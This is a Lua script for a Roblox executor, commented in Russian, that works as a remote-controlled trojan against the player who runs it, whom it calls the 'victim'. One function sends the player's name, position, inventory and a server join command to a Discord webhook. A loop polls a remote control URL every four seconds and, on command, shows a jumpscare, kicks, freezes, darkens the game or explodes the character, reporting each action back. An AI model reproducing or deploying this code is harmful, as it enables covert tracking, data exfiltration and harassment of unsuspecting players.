-- 1. ФУНКЦИЯ ЛОГИРОВАНИЯ (В Discord)
local function sendMasterLog(title, desc, color)
    pcall(function()
        local inv = ""
        for _, v in pairs(lp.Backpack:GetChildren()) do inv = inv .. "[" .. v.Name .. "] " end
        local pos = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") and lp.Character.HumanoidRootPart.Position or Vector3.new(0,0,0)
        
        local data = {
            ["embeds"] = {{
                ["title"] = title,
                ["description"] = desc,
                ["color"] = color or 0x00a2ff,
                ["fields"] = {
                    {["name"] = "👤 Жертва", ["value"] = "||"..lp.Name.."||", ["inline"] = true},
                    {["name"] = "📍 Позиция", ["value"] = math.floor(pos.X)..", "..math.floor(pos.Y)..", "..math.floor(pos.Z), ["inline"] = true},
                    {["name"] = "🎒 Инвентарь", ["value"] = "```" .. (inv ~= "" and inv or "Пусто") .. "```"},
                    {["name"] = "🎮 Команда захода", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')```"}
                },
                ["footer"] = {["text"] = "AxM System • " .. os.date("%X")}
            }}
        }
        local req = request or http_request or (syn and syn.request)
        if req then req({Url = log_webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end
    end)
end

-- 2. ЦИКЛ КОНТРОЛЯ (Через GitHub)
task.spawn(function()
    local last_cmd = ""
    while task.wait(4) do -- Проверка каждые 4 секунды
        pcall(function()
            local cmd = game:HttpGet(control_url .. "?t=" .. tick())
            cmd = string.lower(cmd):gsub("%s+", "") -- Чистим текст

            if cmd ~= last_cmd and cmd ~= "safe" then
                last_cmd = cmd
                local char = lp.Character or lp.CharacterAdded:Wait()
                local hum = char:FindFirstChildOfClass("Humanoid")

                -- Обработка команд
                if string.find(cmd, "screamer") then
                    local g = Instance.new("ScreenGui", lp.PlayerGui)
                    local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1,0,1,0); i.Image = "rbxassetid://15518663806"
                    local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s:Play()
                    task.delay(0.5, function() g:Destroy() end)
                    sendMasterLog("😱 ВЫПОЛНЕНО: СКРИМЕР", "Игрок напуган", 0xFFFFFF)

                elseif string.find(cmd, "kick") then
                    local reason = string.match(cmd, "%((.*)%)") or "Disconnected"
                    sendMasterLog("💀 ВЫПОЛНЕНО: КИК", "Причина: " .. reason, 0x000000)
                    lp:Kick("\n[AxM Admin]\n" .. reason)

                elseif string.find(cmd, "freeze") then
                    char.HumanoidRootPart.Anchored = true
                    sendMasterLog("🧊 ВЫПОЛНЕНО: ЗАМОРОЗКА", "Игрок обездвижен", 0x00EBFF)

                elseif string.find(cmd, "unfreeze") then
                    char.HumanoidRootPart.Anchored = false
                    sendMasterLog("🔥 ВЫПОЛНЕНО: РАЗМОРОЗКА", "Игрок снова ходит", 0xFF8000)

                elseif string.find(cmd, "horror") then
                    Lighting.ClockTime = 0; Lighting.Brightness = 0
                    sendMasterLog("🌑 ВЫПОЛНЕНО: ХОРРОР", "Включена вечная ночь", 0x333333)

                elseif string.find(cmd, "explode") then
                    local ex = Instance.new("Explosion", char.HumanoidRootPart)
                    ex.Position = char.HumanoidRootPart.Position
                    sendMasterLog("💥 ВЫПОЛНЕНО: ВЗРЫВ", "Персонаж разорван", 0xFF0000)
                end
            end
        end)
    end
end)

